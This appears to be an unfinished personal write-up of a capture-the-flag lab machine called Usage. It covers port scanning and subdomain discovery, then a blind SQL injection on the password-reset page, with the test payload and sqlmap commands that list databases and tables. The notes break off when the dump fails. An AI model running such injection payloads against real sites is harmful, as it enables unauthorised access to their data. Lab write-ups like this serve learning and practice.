## Linux Machine Usage

--[+] :  Target IP :

      >> 10.10.11.18
     
## Recon 
--[1] : Nmap
```nmap
		PORT   STATE SERVICE
		22/tcp open  ssh
		80/tcp open  http
```
	>> Port 80 appears to be running laravel
	
--[2] :  Gobuster 
      >> http://usage.htb/ 503 and 404 only 

--[3] :  Page subdomains :

      >> http://admin.usage.htb/

## Foothold
--[+] :  Blind sql injection on http://usage.htb/forget-password  :
      >> payload : ' AND 1=1;-- -
      >> sqlmap -r req.txt --risk=3 --level=5 --batch --dbms=mysql --dbs

available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog

      >> sqlmap -r req.txt --risk=3 --level=5 --batch -D usage_blog --tables
      >> sqlmap -r req.txt --risk=3 --level=5 --batch -D usage_blog -T users
      
      dump is fucked up lets see another time ... maybe machine down 
      
      //15-06-2024 -> completing the machine 
      
       
--[+] :  Target IP :

      >> 
--[+] :  Target IP :

      >> 
